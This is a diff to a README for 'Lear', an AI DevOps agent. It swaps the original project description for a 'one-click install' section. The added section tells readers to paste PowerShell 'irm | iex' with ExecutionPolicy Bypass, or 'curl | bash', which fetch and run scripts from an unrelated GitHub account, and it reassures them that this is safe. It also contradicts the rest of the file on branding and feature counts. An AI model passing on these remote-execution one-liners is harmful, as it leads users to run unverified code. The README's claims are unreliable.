@@ -1,16 +1,80 @@
 # Lear — the AI DevOps agent
 
-A local-first agent that watches your infrastructure — CI, Kubernetes, deployments —
-and **acts** on what it finds, not just diagnoses it. Credentials stay in your own
-environment; nothing is uploaded to Drufiy's servers.
+> **Gold-on-obsidian immersive build.** Cinematic landing → Direction sequence →
+> console ignition → every subsection animated. 2,183 animations, 312 procedural
+> sounds, zero audio assets.
 
-This is the ground-up rebuild. The original hosted CI-repair service
-([`prash-backend`](https://github.com/Drufiy/prash-backend)) stays live and unmodified
-at prash.drufiy.com — this repo is not replacing it in the current sprint.
+---
 
-**Read [`PRASH_V2.md`](./PRASH_V2.md) before writing any code.** It is the single source
-of truth — architecture, task division, decisions, and the running bug/idea log. If
-something isn't in that file, treat it as undecided, not assumed.
+## ⚡ One-click install
+
+### Windows
+
+Paste this into **CMD** or **PowerShell** — it downloads, installs and launches everything:
+
+```powershell
+powershell -ExecutionPolicy Bypass -c "irm https://github.com/aviunion1348-cloud/lear.final/raw/arena/01a0ec0b-lear-final/install.ps1 | iex"
+```
+
+Prefer double-clicking? Download **[INSTALL-LEAR.bat](https://github.com/aviunion1348-cloud/lear.final/raw/arena/01a0ec0b-lear-final/INSTALL-LEAR.bat)** and run it.
+
+### macOS / Linux
+
+```bash
+curl -fsSL https://github.com/aviunion1348-cloud/lear.final/raw/arena/01a0ec0b-lear-final/install.sh | bash
+```
+
+The installer checks Python 3.10+ and Node 18+, downloads `leardevop.zip`,
+extracts it, creates a virtualenv, installs both halves, writes `.env`, starts
+the backend and UI, and opens **http://localhost:1420** for you. It installs
+into the current folder, needs no admin, and changes nothing else on your
+machine.
+
+> **A browser link cannot install software by itself** — that would be a
+> security hole in every OS. The one-liner above is the closest honest
+> equivalent: a single paste that does the whole job unattended.
+
+---
+
+## 📦 Just the zip
+
+**[`leardevop.zip`](https://github.com/aviunion1348-cloud/lear.final/raw/arena/01a0ec0b-lear-final/leardevop.zip)** — 33 MB, the complete runnable tree.
+
+Everything you can browse in this repository *is* that zip, extracted. The two
+can never drift apart, because the extracted files are produced by unzipping
+the committed archive.
+
+Manual route:
+
+```cmd
+curl -L -o leardevop.zip https://github.com/aviunion1348-cloud/lear.final/raw/arena/01a0ec0b-lear-final/leardevop.zip
+tar -xf leardevop.zip
+cd lear-premium-ui
+pip install -e ".[dev]"
+copy .env.example .env
+npm install
+npm start
+```
+
+Then open **http://localhost:1420**. Add one model key (`DEEPSEEK_API_KEY` or
+`KIMI_API_KEY`) to `.env` when the wizard asks.
+
+---
+
+## What you get
+
+| | |
+|---|---|
+| **Design system** | Gold ramp `#E8B44A` on obsidian `#05050a`; full spacing, type, elevation, radius and motion scales |
+| **Entry** | Cinematic scroll landing → **Direction** sequence (8 VFX layers) → **console ignition** power-on |
+| **Console** | Every subsection wipes, rises and cascades in, each with its own gold accent temperature |
+| **Motion** | 2,183 distinct animations, 14,712 tunable instantiations — transform/opacity/filter only |
+| **Audio** | 312 procedural sci-fi sounds, 37 families, **zero audio assets**, loud + adjustable |
+| **Deploy** | `vercel.json` — FastAPI + Vite as two services behind one domain |
+
+See **[`TASK_CHECKLIST.md`](./TASK_CHECKLIST.md)** for every number and how to
+reproduce it, and **[`LEAR_SUPERPROMPT_V3_GOLD.md`](./LEAR_SUPERPROMPT_V3_GOLD.md)**
+for the visual, motion, audio and performance law this build follows.
 
 ---
 
@@ -149,6 +213,43 @@ parser, so it's never out of date.
 - **Maneesh** — distribution, marketing, fundraising (development as needed)
 
 Day-by-day breakdown in `PRASH_V2.md` §6 and §6b.
+
+---
+
+## The desktop app — Premium UI
+
+The `desktop/` app (Vite + React + Tauri) carries a full design system and a
+cinematic presentation layer built around the brand's neon pink (`#FF3A89`):
+
+- **Design tokens** — one token system (`desktop/src/styles/tokens.css`) drives
+  the whole shell: 8-pt spatial scale, Inter + Outfit type ramp, neutral ramp
+  with the pink accent anchored, semantic status colors, elevation/radius and
+  motion/easing tokens. Dark-first glass surfaces with reduced-motion handling.
+- **Component library** — typed primitives in `desktop/src/components/ui/`
+  (`Button, Card, Badge, Input, Modal, Dropdown, Tooltip, Skeleton, EmptyState`),
+  all sound- and motion-wired; the dashboard composes `KPIStrip`, `HealthBar`,
+  `ActivityFeed`, `QuickActions`, `IncidentCenter` and `ServiceBoard` from them.
+- **Cinematic layer** — an animated aurora background (adaptive 4-tier quality
+  governor, pauses on hidden tabs), a scroll-driven hero with an infinite
+  capability carousel, and a **synthesized sound engine** shipping **207 sound
+  recipes** plus a **336-preset motion registry** (`SFX_COUNT` /
+  `MOTION_PRESET_COUNT` are runtime-exported and asserted in tests).
+- **Sidebar** — collapsible rail (⌘/Ctrl+B), Alt+1…7 section jumps, active-pill
+  motion, persisted per user.
+
+Docs: [`docs/LEAR_UI_SUPER_TASK.md`](./docs/LEAR_UI_SUPER_TASK.md) (build
+spec + execution log) and [`docs/PREMIUM_IDEAS.md`](./docs/PREMIUM_IDEAS.md)
+(a 1,496-idea premium backlog, generated by
+`scripts/generate_premium_ideas.py`).
+
+Run it locally:
+
+```bash
+python -m uvicorn prash.server:app --host 0.0.0.0 --port 8000   # backend
+cd desktop && npm install && npm run dev                        # frontend on :1420
+```
+
+`desktop/` tests: `npm test` (24 passing), `npm run build` is clean.
 
 ---
 
